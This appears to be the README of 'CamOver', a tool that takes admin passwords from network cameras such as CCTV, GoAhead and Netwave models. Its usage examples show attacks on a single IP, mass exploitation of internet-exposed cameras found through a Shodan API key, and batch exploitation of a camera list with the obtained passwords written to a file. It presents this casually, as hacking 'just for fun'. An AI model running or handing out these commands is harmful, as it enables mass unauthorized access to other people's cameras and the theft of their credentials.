## CamOver

Is a camera exploitation tool that allows to disclosure network camera admin password.

**Features:**

* Exploits vulnerabilities in most popular camera models such as CCTV, GoAhead and Netwave.
* Optimized to exploit multiple cameras at one time from list with threading enabled.

## Examples

### Exploiting single camera

Let's hack my camera just for fun.

```plain
camover -a 192.168.99.100
```

### Exploiting cameras from Internet

Let's try to use Shodan search engine to exploit cameras over Internet, we will use it with `-t` for fast exploitation.

```plain
camover -t --shodan [API-KEY]
```

```plain
$ camover -t --shodan [REDACTED]

```

### Exploiting cameras from input file

Let's try to use opened database of cameras with -t for fast exploitation.

```plain
camover -t -i cameras.txt -o passwords.txt
```

NOTE: It will exploit all cameras in `cameras.txt` list by their addresses and save all obtained passwords to `passwords.txt`.
